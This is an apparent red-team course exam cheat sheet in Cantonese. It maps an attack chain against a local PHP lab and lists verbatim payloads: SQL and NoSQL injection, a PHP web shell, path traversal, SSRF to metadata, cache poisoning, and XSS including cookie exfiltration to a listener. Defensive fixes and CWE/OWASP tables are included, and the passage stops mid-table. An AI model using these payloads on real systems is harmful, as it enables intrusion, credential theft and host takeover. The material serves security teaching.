# ART — Final Cheat Sheet（Advanced Red Team 全科累積速記）

> **來源**：本教程 11 份筆記（見 02_Study_Guides/），原教材 Advanced Red Team — Tutorial 3
> **使用時機**：考試前 5–10 分鐘快速掃描；只保留「攻擊鏈地圖、逐節 payload、CWE／OWASP、Error/Fix、英文必背句、自測」。
> **覆蓋範圍**：Stage 0 環境與工具／① 公開偵察／②A 認證與自動化濫用／②B 注入與 SSO／③ 權限提升／④ 憑證蒐集／⑤ 橫向檔案存取／⑥ 主機淪陷；共 15 節（§0–§14）。
> 詳細解說請回查各階段 Study Guide（`ART_T3_01` 及各攻擊階段 `ART_T3_02`～`ART_T3_08`）。
> ⚠️ 本檔只覆蓋各筆記已有之內容與教材外補充；payload、URL、值一律照來源逐字，唔會臨場改寫。
> ⚠️ 全部技術只准喺課程靶場／自己擁有嘅系統練習。未授權存取在香港屬刑事罪行。

**速覽目錄**：Part 1 攻擊鏈總覽｜Part 2 逐節 payload 速查（A–J 組）｜Part 3 CWE／OWASP 對照｜Part 4 常見 Error 與 Fix｜Part 5 英文必背句 40 條｜Part 6 60 秒自測 38 條｜Part 7 防守方 30 秒修正清單

---

## Part 1：攻擊鏈總覽速記

**前置 Stage 0（`ART_T3_01`）**：啟動靶場（plain PHP ＋ 本地 SQLite）＋ Burp 代理設定 ＋ Repeater／Intruder 兩種工具用法。呢個階段唔係攻擊本身，係之後 15 節嘅操作地台。

> 一句原文總結：「public recon → initial access → privilege escalation → credential discovery → lateral file access → host compromise」

| 階段 | 目標（一句話） | 涉及節 | 一句話重點 | 對應檔名 |
|---|---|---|---|---|
| ① 公開偵察／Public recon | 由公開來源蒐集 OSINT，**登入前**就漏出有效用戶名 | §8 | 公開員工名錄＋JSON API 免費送 username，令憑證猜測問題砍一半 | `ART_T3_02_PublicRecon_StudyGuide.md` |
| ② 初始存取／Initial access | 由弱嘅「前門」打入 | §1、§2、§4、§6、§12 | 前端驗證、無 rate limit、拼接查詢＝三大入口 | `ART_T3_03_InitialAccess_A_CredentialAttacks_StudyGuide.md`（§1、§2、§6）／`ART_T3_04_InitialAccess_B_Injection_OAuth_StudyGuide.md`（§4、§12、§13） |
| ③ 權限提升／Privilege escalation | 由低權限據點升到 admin | §3 | 一個漏檢查嘅 upload endpoint 一路通到 RCE | `ART_T3_05_PrivilegeEscalation_StudyGuide.md` |
| ④ 憑證蒐集／Credential discovery | 收割周圍放低嘅秘密 | §8、§9 | 可預測備份檔名＋暴露 `.git`＝送密碼庫 | `ART_T3_06_CredentialDiscovery_StudyGuide.md` |
| ⑤ 橫向檔案存取／Lateral file access | 觸及更多數據／伺服器 | §5、§7、§10、§14 | 四洞同一病因：用戶嘅字被當成系統嘅意思 | `ART_T3_07_LateralFileAccess_StudyGuide.md` |
| ⑥ 主機淪陷／Host compromise | 由 web 用戶升到主機層權限 | §11 | LFI 讀內部備忘錄 → 重建密碼 → SSH root | `ART_T3_08_HostCompromise_StudyGuide.md` |

**配套檔（教材外）**：`ART_T3_00_Primer_BeforeYouStart_StudyGuide.md`（零經驗先修）、`ART_T3_09_Glossary_StudyGuide.md`（雙語術語表）。原文叫你睇嘅 Before You Start／Tool Setup Guide／Glossary 喺原教材並唔存在，係原文已核實嘅缺口。

**15 節 ↔ 筆記檔名速查（原文 Table of Contents）**

| 原文 § | 原文標題 | 收錄於 |
|---|---|---|
| §0 | Lab Setup | `ART_T3_01_Setup_Tools_AttackChain_StudyGuide.md` |
| §1 | CAPTCHA Bypass | `ART_T3_03` |
| §2 | Email Bomb | `ART_T3_03` |
| §3 | Admin Privilege Escalation (Hidden Endpoint) | `ART_T3_05` |
| §4 | SQL Injection in a JSON Object | `ART_T3_04` |
| §5 | Web Cache Poisoning | `ART_T3_07` |
| §6 | Unlimited Brute Force | `ART_T3_03` |
| §7 | Reflected XSS via HTTP Header | `ART_T3_07` |
| §8 | OSINT / Username Leakage | `ART_T3_02` |
| §9 | Backup File Brute Force | `ART_T3_06` |
| §10 | Local File Inclusion via Language Loader | `ART_T3_07` |
| §11 | Host Privilege Escalation via Internal Hints | `ART_T3_08` |
| §12 | NoSQL Injection via JSON Wildcard | `ART_T3_04` |
| §13 | OAuth / SSO Misconfiguration | `ART_T3_04`（原文 mapping 漏收，教材外補充） |
| §14 | Server-Side Request Forgery (SSRF) | `ART_T3_07` |

- 原文矛盾點一：**§8 同時屬階段①同④**（OSINT 搵用戶名既係偵察、亦係憑證蒐集）；本系列把 §8 主體放 ART_T3_02，ART_T3_06 只作交叉引用。
- 原文矛盾點二：原文六階段 mapping **完全冇收錄 §13 OAuth**；本系列按「帳號接管」性質歸入階段②B。

### 階段 × 成功訊號（靶場實證）

| 階段 | 成功訊號（原文） |
|---|---|
| ① 公開偵察 | 由 stealer log 抽到可用憑證對；`id=1` 回 `New admin tools`；見到 `Welcome back` |
| ②A 認證濫用 | 頁面出現 `Account created`；response 顯示 `Sent N reset email(s)`；`tools/brute.py` 輸出 `[+] CRACKED: user / password` |
| ②B 注入／SSO | 注入回 `{"status":"ok"}`；blind 出 `Extracted password:`；NoSQL 結果由 5 筆變 6 筆；偷到 code ＋ 新鮮 state 登入見到 `admin` |
| ③ 權限提升 | 目錄掃描 302 確認路徑存在；`/uploads/shell.php?cmd=id` 回 `uid=1000(...)`；見到 admin flag |
| ④ 憑證蒐集 | 撞到備份檔回 HTTP 200；由 config／DB dump 掘到秘密；`git log --oneline` 列出 commit |
| ⑤ 橫向存取 | private window 仍見毒連結（真污染）；`lang=../../etc/passwd` 讀到檔；metadata 回假 AWS 憑證 |
| ⑥ 主機淪陷 | LFI 讀到內部備忘錄；重建 `123qwe!@#`；SSH root 成功 |

### 六階段一句英文（背住串法）

- Stage 1 — "public recon"
- Stage 2 — "initial access"
- Stage 3 — "privilege escalation"
- Stage 4 — "credential discovery"
- Stage 5 — "lateral file access"
- Stage 6 — "host compromise"

> 合併句："The capstone chain: public recon → initial access → privilege escalation → credential discovery → lateral file access → host compromise."

---

## Part 2：逐節 payload／指令速查

> **使用守則**：以下每一行都係來源筆記嘅**逐字** payload／指令／值（少數「複合步驟行」係把多個逐字元件串成一句，元件本身仍逐字可查）。⚠️ 全部只准喺課程靶場使用。

### A 組：認證繞過

| 情境 | payload／指令（原文逐字） | 來源 |
|---|---|---|
| CAPTCHA 洩漏答案 | `captcha=12&captcha_answer=12` | ART_T3_03 §1 |
| CAPTCHA 省略欄位 | 只 POST `username`、`full_name`、`email`、`password`（完全唔交 captcha） | ART_T3_03 §1 |
| CAPTCHA magic word | `captcha=bypass` | ART_T3_03 §1 |
| SQLi 登入繞過（tautology，JSON body） | `{"username":"admin' OR '1'='1","password":"x"}` | ART_T3_04 §4 |
| NoSQL operator 繞登入 | `{"username":"admin", "password":{"$ne":""}}` | ART_T3_04 §12 |
| OAuth 偷 code（改 redirect_uri） | `redirect_uri=http://localhost:8080/oauth.php?action=callback` → 改去 `http://localhost:9099/callback.php` | ART_T3_04 §13 |
| OAuth force-login | `http://localhost:8080/oauth.php?action=callback&code=<STOLEN_CODE>&state=<FRESH_STATE>` | ART_T3_04 §13 |

### B 組：注入

| 情境 | payload／值（原文逐字） | 來源 |
|---|---|---|
| 布林真條件 | `{"username":"admin' AND '1'='1' OR '1'='1","password":"x"}`（回 200） | ART_T3_04 §4 |
| 布林假條件 | `{"username":"admin' AND '1'='2' OR '1'='1","password":"x"}`（回 401） | ART_T3_04 §4 |
| Blind 子查詢（問一字元） | `admin' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='1' OR '1'='1` | ART_T3_04 §4 |
| lab bad list（filter 內容） | `['UNION', 'INSERT', 'DELETE', 'UPDATE', 'DROP', '--', ';', '/*']`（`str_ireplace()` case-insensitive） | ART_T3_04 §4 |
| NoSQL wildcard | `{"role":"*"}` | ART_T3_04 §12 |
| NoSQL `$ne` | `{"role":{"$ne":"nonexistent"}}` | ART_T3_04 §12 |
| 真／假訊號（MySQL 走 JSON path） | 真 = HTTP 200 + `{"status":"ok"}`；假 = HTTP 401 + `{"status":"error","message":"Invalid credentials"}` | ART_T3_04 §4 |
| baseline vs 注入 | `{"role":"user"}` → 5 筆；`{"role":"*"}`／`{"$ne":"nonexistent"}` → 6 筆 | ART_T3_04 §12 |

### C 組：檔案讀取與上傳

| 情境 | payload／指令（原文逐字） | 來源 |
|---|---|---|
| 路徑穿越讀檔 | `http://localhost:8080/index.php?lang=../../../../../../etc/passwd` | ART_T3_07 §10 |
| 路徑穿越讀 backup | `http://localhost:8080/index.php?lang=../backup/config.php.bak` | ART_T3_07 §10 |
| 讀內部備忘錄 | `http://localhost:8080/index.php?lang=../../../../../../home/tyz/host_hints/IT_Notice.txt` | ART_T3_08 §8.2 |
| 讀密碼政策 | `http://localhost:8080/index.php?lang=../../../../../../opt/IT/password_policy.txt` | ART_T3_08 §8.2 |
| 上載請求（繞 default-deny） | `POST /admin/upload.php HTTP/1.1` + `Cookie: PHPSESSID=<...>` + `Content-Type: multipart/form-data; boundary=X` | ART_T3_05 §8.2 |
| 檔名 oracle（試 field 名） | `name="file"`（試：file, upload, uploadfile, file_upload, attachment, userfile, doc, document, image, photo） | ART_T3_05 §8.2 |
| Probe 檔案 | `/uploads/test.txt` | ART_T3_05 §8.2 |
| Web shell（一行 backdoor） | `<?php echo system($_GET['cmd']); ?>` | ART_T3_05 §8.2 |
| 執行命令（RCE） | `/uploads/shell.php?cmd=id`（成功如 `uid=1000(...)`） | ART_T3_05 §8.2 |
| .git 重構版本歷史 | `git clone http://localhost:8080/backup/.git /tmp/lab-src && cd /tmp/lab-src && git log --oneline` | ART_T3_06 Q3 |

### D 組：SSRF 與代理類

| 情境 | payload／指令（原文逐字） | 來源 |
|---|---|---|
| 讀雲 metadata（假 AWS 憑證） | `http://localhost:8080/metadata.php?path=latest/meta-data/iam/security-credentials/LabInstanceRole` | ART_T3_07 §14 |
| 讀內部 secrets | `http://localhost:8080/internal/api.php?endpoint=secrets`（SMTP／API／VPN／DB secrets） | ART_T3_07 §14 |
| 讀內部 users | `http://localhost:8080/internal/api.php?endpoint=users`（service accounts） | ART_T3_07 §14 |
| image proxy 變讀檔器 | `curl "http://localhost:8080/imgproxy.php?url=file:///etc/passwd"` | ART_T3_07 §14 |

- §14 相關功能／參數名（原文）：`/services.php`（Page Preview）、`/pdf.php`（Report Export）、`/imgproxy.php`（image proxy）；參數名 `?url=`、`?page=`、`?preview=`、`?feed=`、`?target=`、`?callback=`。
- metadata 位址：`169.254.169.254`（AWS）／`metadata.google.internal`（GCP）；loopback 服務 Redis `6379`、Elasticsearch `9200`。

### E 組：快取與 XSS

| 情境 | payload／值（原文逐字） | 來源 |
|---|---|---|
| §5 cache canary（確認 unkeyed） | `X-Forwarded-Host: hkiitcanary1234` | ART_T3_07 §5 |
| §5 毒 host | `X-Forwarded-Host: evil.example.com` | ART_T3_07 §5 |
| §7 反射確認 | `X-Username: CANARY_TEST_123` | ART_T3_07 §7 |
| §7 script 標籤 | `X-Username: <script>document.body.style.border='12px solid red'</script>` | ART_T3_07 §7 |
| §7 img onerror | `X-Username: <img src=x onerror="this.outerHTML='<mark>XSS via img onerror</mark>'">` | ART_T3_07 §7 |
| §7 svg onload | `X-Username: <svg onload="this.outerHTML='<mark>XSS via svg onload</mark>'"></svg>` | ART_T3_07 §7 |
| §7 偷 cookie | `X-Username: <img src=x onerror="this.outerHTML='<mark>Stolen cookie: '+document.cookie+'</mark>'">` | ART_T3_07 §7 |
| §7 外傳到 listener | `X-Username: <img src=x onerror="fetch('http://192.168.56.1:8088/?c='+encodeURIComponent(document.cookie))">` | ART_T3_07 §7 |
| §7 lab 內部 collector | `X-Username: <img src=x onerror="fetch('/oauth.php?action=leak&c='+encodeURIComponent(document.cookie)).then(()=>this.outerHTML='<mark>Cookie exfiltrated to attacker server</mark>')">` | ART_T3_07 §7 |

- §5 cache key = `md5($_SERVER['REQUEST_URI'])`；header = `X-Forwarded-Host`；毒 host = `evil.example.com`。
- §7 candidate headers：`User-Agent`、`Referer`、`X-Forwarded-For`、`Cookie`；custom wordlist：`X-Username`、`X-User`、`X-User-ID`、`X-Forwarded-User`；工具 Param Miner；listener port `8088`。
- §10 參數 `?lang=`；語言檔 `lang/en`、`lang/zh`、`lang/zht`；loader `includes/language.php`；path = `ROOT_DIR . '/lang/' . $_GET['lang']`；poison paths：`php://filter`、`phar://`。

### F 組：OSINT 與備份檔

| 情境 | payload／指令（原文逐字） | 來源 |
|---|---|---|
| 忽略大小寫搵目標網域行 | `grep -i hkgov data/stealer_sample.log` | ART_T3_02 §8 |
| 收窄並抽 username:password | `grep 'hkgov-service.local' data/stealer_sample.log \| awk -F: '{print $3 ":" $4}'` | ART_T3_02 §8 |
| 造 username wordlist | `cat > users.txt <<'EOF'` … `EOF` | ART_T3_02 §8 |
| 行憑證攻擊 | `python3 tools/brute.py http://localhost:8080` | ART_T3_02 §8 |
| 記錄攻擊面 | Burp **Proxy → HTTP history** | ART_T3_02 §8 |
| IDOR 探測 | `GET /message.php?id=2`（`id=1` 回 `New admin tools`） | ART_T3_02 §8 |

- 兩個未認證洩漏點：`/staff.php`（員工名錄）、`/api/users.php`（JSON API）；JSON 欄位 `username`、`full_name`、`email`、`role`。
- 登入錯誤差異：存在 → `Password incorrect.`；唔存在 → `Username not found.`。
- Stealer log 行格式：`host:port:username:password`；樣本憑證對：`admin:123qwe!@#`、`john.doe:Welcome2024`、`bob.chan:changeme123`、`mary.wong:Passw0rd!`。
- 移位陷阱：`443:mary.wong`（原行帶 URL scheme 令欄位後移一格）。
- Infostealer 名：RedLine、Vidar、Raccoon；MITRE：T1593、T1594、T1589、T1590。

**§9 備份副檔名／模式對照（ART_T3_06 §8.2）**

| 類別 | 模式 |
|---|---|
| Editor temp | `.swp`、`~` |
| Renamed backup | `.bak`、`.old`、`.orig` |
| DB dump | `.sql` |
| Archive | `.zip`、`.tar.gz`、`.7z` |
| Dated archive | `site_backup_YYYYMMDD.zip` |
| Source-control | `.git`、`.svn`、`.hg` |
| IDE 資料夾 | `.idea`、`.vscode` |
| 其他敏感檔 | `.env`、`phpinfo.php` |

- 本 lab 暴露路徑：`/backup/config.php.bak`、`/backup/users_backup.sql`、`/backup/lab.db.bak`、`/backup/site_backup_20240720.zip`、`/backup/source.zip`、`/backup/.git/HEAD`。
- 目標技術棧：PHP + Apache（`Server: Apache/…`、`X-Powered-By: PHP/…`）。

### G 組：權限提升

| 情境 | payload／指令（原文逐字） | 來源 |
|---|---|---|
| 目錄爆破 | `gobuster dir -u http://localhost:8080/admin -w /usr/share/wordlists/dirb/common.txt` | ART_T3_05 §8.2 |
| IDOR 探測 | `/message.php?id=1` → `id=2`、`id=3` | ART_T3_05 §8.2 |
| 拎 session 值 | Firefox DevTools → Storage → Cookies → `PHPSESSID` | ART_T3_05 §8.2 |
| 用戶名收割 | `/api/users.php` + `/staff.php` | ART_T3_03 §6 |
| Burp Intruder positions | `username=§admin§&password=§x§`（Cluster bomb） | ART_T3_03 §6 |
| 暴力破解（無 cookie） | `POST /login.php` 刪走 `Cookie:` header | ART_T3_03 §6 |
| 主機提權登入 | `ssh root@localhost`（重建密碼 `123qwe!@#`） | ART_T3_08 §8.2 |

- 三個相扣弱點：**IDOR（horizontal）→ Broken function-level authorization → Unrestricted upload（vertical）**。
- `/admin/upload.php` 係 `/admin/` 樹唯一漏檢查嘅 endpoint：條件寫成「`!is_admin()` **AND**（非 POST **OR** 冇 file）」。
- upload 檔案落入 `/uploads/`（web root 內）；`$upload_dir = __DIR__ . '/../uploads/'`。
- 狀態碼判別：**302 = 存在（未登入時）**；**404 = 唔存在**；**403 = 存在但你冇權**。
- §6 鎖定門檻 **5 次失敗**（綁 session cookie）；成功訊號 **302 + 長度不同**；`brute.py` 預設 base URL `http://localhost:8080`。

### H 組：工具操作（Stage 0）

| 用途 | 指令／設定（原文逐字） | 來源 |
|---|---|---|
| 起靶場 | `PHP_CLI_SERVER_WORKERS=12 php -S 0.0.0.0:8080` | 01 §8.2 |
| 建庫（一次） | Firefox 去 `http://127.0.0.1:8080/init_db.php` | 01 §8.2 |
| 預設管理員 | `admin / 123qwe!@#` | 01 §8.2 |
| FoxyProxy profile | Title `Burp`／Type `HTTP`／Hostname `127.0.0.1`／Port `8080` | 01 §8.2 |
| 攞 Burp CA | Firefox 去 `http://burpsuite`（下載 `cacert.der`） | 01 §8.2 |
| 裝 CA | Firefox View Certificates → Authorities → Import → 剔 Trust this CA to identify websites | 01 §8.2 |
| 單請求改完重播 | 右 Click → Send to Repeater → Send | 01 §8.2 |
| 自動化大量請求 | 右 Click → Send to Intruder → Clear § → Add § → Payloads → Start attack | 01 §8.2 |
| 變數字序列 | Intruder：單一 position ＋ Numbers payload type | 01 §8.2 |
| 靶場端口／Burp listener | `8080`／`127.0.0.1:8080` | 01 §8.1 |
| 憑證權威名稱 | PortSwigger CA | 01 §8.1 |

- 原文工具原則：web 練習一律用 Firefox、Burp Suite 或 OWASP ZAP；Postman 只用於 §2 其中一個練習；`tools/` 係導師／自動化示範用。
- §2 email bomb 用 Intruder payload type **Numbers 1→50 step 1**；body `email=` 唯一 position。
- mail 容器 `hkgov-mail`、Roundcube port `8081`；webmail 去 `http://localhost:8080/webmail.php` 或 `http://localhost:8081`。

### I 組：防守設定（修法片段）

| 場景 | 設定／指令（原文逐字） | 來源 |
|---|---|---|
| PHP CAPTCHA session 比對 | `if (!isset($_SESSION['captcha_answer']) \|\| $_POST['captcha'] !== $_SESSION['captcha_answer']) { reject(); }` 之後 `unset($_SESSION['captcha_answer'])` | ART_T3_03 §9.1 |
| PHP 輸出編碼 | `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` | ART_T3_07 §9.2 |
| PHP 參數綁定 | PDO prepared statements + `bindParam`／`execute([...])`；`PDO::ATTR_EMULATE_PREPARES = false` | ART_T3_04 §9.1 |
| PHP 密碼雜湊 | `password_hash($pw, PASSWORD_BCRYPT)`／`password_verify()` | ART_T3_03 §9.3 |
| LFI allow-list | `$allowed = ['en' => 'lang/en', ...]; if (!isset($allowed[$lang])) $lang = 'en';` 再用 `realpath` 檢查 | ART_T3_07 §9.3 |
| SSRF cURL 限制 | `CURLOPT_PROTOCOLS`／`CURLOPT_REDIR_PROTOCOLS` 限 `https`、`CURLOPT_FOLLOWLOCATION=false` | ART_T3_07 §9.4 |
| Apache 封 dotfile | 用 `<FilesMatch>` 或 `<Directory>` 封 dotfile（回 403／404）；`Options -Indexes` | ART_T3_06 §9.2 |
| Nginx 封 dotfile | `location ~ /\.(?!well-known)` 回 404；`autoindex off;` | ART_T3_06 §9.2 |
| PHP-FPM 隔離 | 專屬低權限用戶 pool；`open_basedir` 限制可存取路徑 | ART_T3_08 §9.2 |
| ASP.NET 授權 | `[Authorize(Roles = "Admin")]`；`AddOpenIdConnect` 設 `CallbackPath`、`ResponseType = code`、開 PKCE | ART_T3_05 §9／ART_T3_04 §9.3 |
| ASP.NET 帳號鎖定／限速 | `MaxFailedAccessAttempts` + `LockoutTimeSpan`；`AddRateLimiter` 綁 IP/user | ART_T3_03 §9.3 |
| SSH 加固 | `PermitRootLogin no`；`pam_google_authenticator` 做 MFA | ART_T3_08 §9.1 |

### J 組：高危 payload 反面教材（唔好誤用）

| 項目 | 內容（原文逐字） | 為何係反面教材 |
|---|---|---|
| 教材示範 flag | `FLAG{HIDDEN_ADMIN_ENDPOINT_ESCALATION_SUCCESS}` | 靶場通關標記，唔係真實目標；唔好當成「去搵真 flag」嘅練習心態 |
| 一行 web shell | `<?php echo system($_GET['cmd']); ?>` | 落入 web root 即 RCE；防守方最怕嘅樣板 |
| Magic string backdoor | `captcha=bypass` | production code 出現 magic string＝萬能鎖匙，code review 易走漏 |
| Delimiter 放大 | `email=victim@example.com;victim@example.com;…` | 一封 request → N 封 email；真實環境即攻擊行為 |
| Cache 毒 host | `X-Forwarded-Host: evil.example.com` | 影響**其他訪客**，唔止自己 |
| 敏感目標 | `/etc/passwd`、`/backup/config.php.bak`、`.git/`、`123qwe!@#` | 全部係課程靶場專用；對真實系統動手即越線 |
| 外傳 cookie | `fetch('http://192.168.56.1:8088/?c='+…)` | exfiltration；實戰中型大量用戶受害 |

### Part 2 附一：逐節解題流程速記（一步一節）

| § | 一步流程（精簡；實作一律以原文為準） | 關鍵落點 |
|---|---|---|
| §1 | 睇原始碼搵 `captcha_answer`／`DEBUG` → 刪走 captcha 欄位 POST → `captcha=bypass` probing | 前端驗證唔係 control |
| §2 | 重播 `POST /forgot.php` → Intruder Numbers 1→50 → `email=victim@example.com;victim@example.com` | 前端倒數只喺 JS |
| §3 | 讀 admin 訊息 → 掃 `/admin`（302）→ 比對 `admin.js` → 手砌 upload POST → web shell → `?cmd=id` | default-deny 一個漏口 |
| §4 | 單引號 probe → tautology 登入 → 布林真／假 → blind `substr()` 逐位出密碼 | JSON 唔係消毒劑 |
| §5 | canary header 確認 unkeyed → 清 cache → 毒 host → private window 驗證 → 影響其他訪客 | cache key 漏咗個輸入 |
| §6 | 收割用戶名 → 差異錯誤確認帳號 → 刪 Cookie 繞鎖定 → Cluster bomb 撞密碼 | 鎖定綁 session cookie |
| §7 | `X-Username` 探反射 → script 證執行 → img onerror／svg onload／偷 cookie／外傳 | 未編碼資料到達 HTML |
| §8 | grep stealer log → awk 抽 pair → 造 wordlist → brute.py → 記攻擊面 | 完整 pair 免猜 |
| §9 | fingerprint → 揀 wordlist → 撞 `/backup/` → 下載 config／dump／`.git` → 掘秘密 | 可預測檔名＋無存取控制 |
| §10 | `?lang=../../../../../../etc/passwd` 證 traversal → 讀 backup source | include 會執行 PHP |
| §11 | LFI 讀內部備忘錄 → 重建密碼 → 讀 `/etc/passwd` 搵 UID 0 → SSH root | 內部文件洩露模式＋無 MFA |
| §12 | `{"role":"*"}` → 比較記錄數 → `{"$ne":"..."}` → `{"username":"admin","password":{"$ne":""}}` 登入 | decode 值入 query object |
| §13 | 改 `redirect_uri` 偷 code → 取新鮮 state → force-login → 見 admin | redirect_uri 無 exact match |
| §14 | `/services.php` 等試 URL 參數 → metadata → internal api secrets／users → imgproxy `file://` | 伺服器被信任 |

### Part 2 附二：逐節關鍵值一覽（背數字用）

| 項目 | 值（原文） | 來源 |
|---|---|---|
| 靶場 server 啟動指令 | `PHP_CLI_SERVER_WORKERS=12 php -S 0.0.0.0:8080` | 01 §8.1 |
| 靶場端口／Burp listener | `8080`／`127.0.0.1:8080` | 01 §8.1 |
| 建庫 URL | `http://127.0.0.1:8080/init_db.php` | 01 §8.1 |
| 預設管理員 | `admin / 123qwe!@#` | 01 §8.1 |
| Burp CA 特殊網址／檔名 | `http://burpsuite`／`cacert.der` | 01 §8.1 |
| 憑證權威名稱 | `PortSwigger CA` | 01 §8.1 |
| 攻擊鏈階段數／Section 總數 | 6 階段／15 節（§0–§14） | 01 §8.1 |
| 原文 student questions 總數 | 53 條 | 01 §8.1 |
| 靶場內部網域／URL | `hkgov-service.local`／`http://localhost:8080` | ART_T3_02 §8 |
| 未認證洩漏點 | `/staff.php`、`/api/users.php` | ART_T3_02 §8 |
| JSON 欄位 | `username`、`full_name`、`email`、`role` | ART_T3_02 §8 |
| 登入錯誤差異 | `Password incorrect.`／`Username not found.` | ART_T3_02 §8 |
| Stealer log 行格式 | `host:port:username:password` | ART_T3_02 §8 |
| 樣本憑證對 | `admin:123qwe!@#`、`john.doe:Welcome2024`、`bob.chan:changeme123`、`mary.wong:Passw0rd!` | ART_T3_02 §8 |
| IDOR 端點 | `GET /message.php?id=2`（`id=1` 回 `New admin tools`） | ART_T3_02 §8 |
| Infostealer 名 | RedLine、Vidar、Raccoon | ART_T3_02 §8 |
| MITRE（OSINT） | T1593、T1594、T1589、T1590 | ART_T3_02 §8 |
| §1 CAPTCHA 弱點編號 | CWE-602、CWE-603／A08:2021 | ART_T3_03 §8.1 |
| §1 三個 bypass | 洩漏答案、省略欄位、magic word `bypass` | ART_T3_03 §8.1 |
| §2 email bomb MITRE／倒數 | T1667／前端倒數 30 秒 | ART_T3_03 §8.1 |
| §6 鎖定門檻／attack type | 5 次失敗／Cluster bomb | ART_T3_03 §8.1 |
| 密碼字典來源 | `rockyou.txt`、SecLists、情境變形、`/opt/IT/password_policy.txt` | ART_T3_03 §8.1 |
| 建議雜湊 | bcrypt／Argon2（NIST SP 800-63B） | ART_T3_03 §8.1 |
| §4 OWASP 2021 數據 | 274,228 個受測應用、32,078 個 CVE、最高 incidence 19% | ART_T3_04 §8.1 |
| §4 In the wild | 2021 Accellion FTA | ART_T3_04 §8.1 |
| §4 還原密碼／flag | `123qwe!@#`／`FLAG{HIDDEN_ADMIN_ENDPOINT_ESCALATION_SUCCESS}` | ART_T3_04 §8.1 |
| §12 baseline vs 注入 | 5 筆 → 6 筆 | ART_T3_04 §8.1 |
| §13 lab provider／client | `http://localhost:8080/oauth_provider.php`；`client_id=gov_lab`、`response_type=code` | ART_T3_04 §8.1 |
| §13 callback | `http://localhost:8080/oauth.php?action=callback` → `http://localhost:9099/callback.php` | ART_T3_04 §8.1 |
| §13 安全標準 | RFC 9700（exact redirect-URI matching、PKCE 全 client） | ART_T3_04 §8.1 |
| §3 admin endpoint | `/admin/upload.php`（`/admin/` 樹唯一漏檢查） | ART_T3_05 §8.1 |
| §3 狀態碼語義 | 302 = 存在；404 = 唔存在；403 = 存在但你冇權 | ART_T3_05 §8.1 |
| §3 目錄爆破工具／路徑 | Gobuster/ffuf/Dirbuster/Burp Intruder；`/admin`、`/api`、`/uploads`、`/.git` | ART_T3_05 §8.1 |
| §9 CWE／OWASP | CWE-530／A05:2021 | ART_T3_06 §8.1 |
| §9 命中判別 | HTTP 200 = 存在可下載；404 = 唔存在 | ART_T3_06 §8.1 |
| §5 cache key／canary／毒 host | `md5($_SERVER['REQUEST_URI'])`／`hkiitcanary1234`／`evil.example.com` | ART_T3_07 §8.1 |
| §5 研究 | James Kettle 2018 "Practical Web Cache Poisoning"、2020 "Web Cache Entanglement" | ART_T3_07 §8.1 |
| §7 header／CWE／OWASP | `X-Username`→`$_SERVER['HTTP_X_USERNAME']`／CWE-79／A03:2021 | ART_T3_07 §8.1 |
| §10 參數／CWE／OWASP | `?lang=`／CWE-22／A01:2021 | ART_T3_07 §8.1 |
| §14 功能／CWE／OWASP | `/services.php`、`/pdf.php`、`/imgproxy.php`／CWE-918／A10:2021 | ART_T3_07 §8.1 |
| §14 metadata | `169.254.169.254`（AWS）、`metadata.google.internal`（GCP） | ART_T3_07 §8.1 |
| §11 密碼長度／重建值 | 9 字元（3 數字＋3 字母＋3 Shift 符號）／`123qwe!@#` | ART_T3_08 §8.1 |
| §11 特權判別 | `/etc/passwd` UID 0，例 `root:x:0:0:root:/root:/bin/bash` | ART_T3_08 §8.1 |
| §11 MITRE／OWASP | TA0004／A07:2021 | ART_T3_08 §8.1 |

---

## Part 3：CWE / OWASP 對照表

| § | 漏洞 | CWE | OWASP 2021 | 收錄檔 |
|---|---|---|---|---|
| §1 | CAPTCHA Bypass | CWE-602（Client-Side Enforcement of Server-Side Security）、CWE-603（Use of Client-Side Authentication） | A08:2021（Software and Data Integrity Failures） | ART_T3_03 |
| §2 | Email Bomb | （安全配置錯誤，原文未編 CWE） | A05:2021（Security Misconfiguration）、A07:2021 | ART_T3_03 |
| §3 | Admin Privilege Escalation (Hidden Endpoint) | CWE-285（Improper Authorization）、CWE-639（Authorization Bypass Through User-Controlled Key / IDOR-BOLA）、CWE-434（Unrestricted Upload of File with Dangerous Type） | A01:2021（Broken Access Control）、A04:2021（Insecure Design） | ART_T3_05 |
| §4 | SQL Injection in a JSON Object | CWE-89（Improper Neutralization of Special Elements used in an SQL Command） | A03:2021（Injection） | ART_T3_04 |
| §5 | Web Cache Poisoning | （unkeyed input，原文未編 CWE） | A05:2021（Security Misconfiguration） | ART_T3_07 |
| §6 | Unlimited Brute Force | CWE-307（Improper Restriction of Excessive Authentication Attempts） | A07:2021（Identification and Authentication Failures） | ART_T3_03 |
| §7 | Reflected XSS via HTTP Header | CWE-79（Improper Neutralization of Input During Web Page Generation） | A03:2021（Injection） | ART_T3_07 |
| §8 | OSINT / Username Leakage | （洩露內部識別碼） | A01:2021、A07:2021 | ART_T3_02 |
| §9 | Backup File Brute Force | CWE-530（Exposure of Backup File to an Unauthorized Control Sphere） | A05:2021（Security Misconfiguration） | ART_T3_06 |
| §10 | LFI via Language Loader | CWE-22（Improper Limitation of a Pathname to a Restricted Directory） | A01:2021（Broken Access Control） | ART_T3_07 |
| §11 | Host Privilege Escalation via Internal Hints | （弱可預測憑證） | A07:2021（Identification and Authentication Failures） | ART_T3_08 |
| §12 | NoSQL Injection via JSON Wildcard | CWE-943（Improper Neutralization of Special Elements in Data Query Logic） | A03:2021（Injection） | ART_T3_04 |
| §13 | OAuth / SSO Misconfiguration | CWE-346（Origin Validation Error） | A07:2021 + OWASP API2（Broken Authentication） | ART_T3_04 |
| §14 | Server-Side Request Forgery (SSRF) | CWE-918（Server-Side Request Forgery） | A10:2021（SSRF） | ART_T3_07 |

**MITRE ATT&CK 對照**

| 主題 | 編號／戰術 |
|---|---|
| OSINT 偵察 | Reconnaissance；T1593、T1594、T1589、T1590 |
| Email Bomb | T1667 Email Bombing（Impact tactic） |
| 主機提權 | TA0004 — Privilege Escalation |

**快速記憶**：注入系（§4、§7、§12）→ A03:2021；存取控制系（§3、§10、§8）→ A01:2021；設定系（§2、§5、§9）→ A05:2021；認證系（§2、§6、§11、§13）→ A07:2021／API2；SSRF（§14）→ A10:2021。

---

## Part 4：常見 Error 與 Fix

> 上半部係原文／筆記提及嘅 error 同卡點；下半部係「新手排查步驟」（本速記整理）。

### 4.1 環境／代理類（Stage 0，`ART_T3_01`）

| 卡點／Error | 成因 | Fix |
|---|---|---|
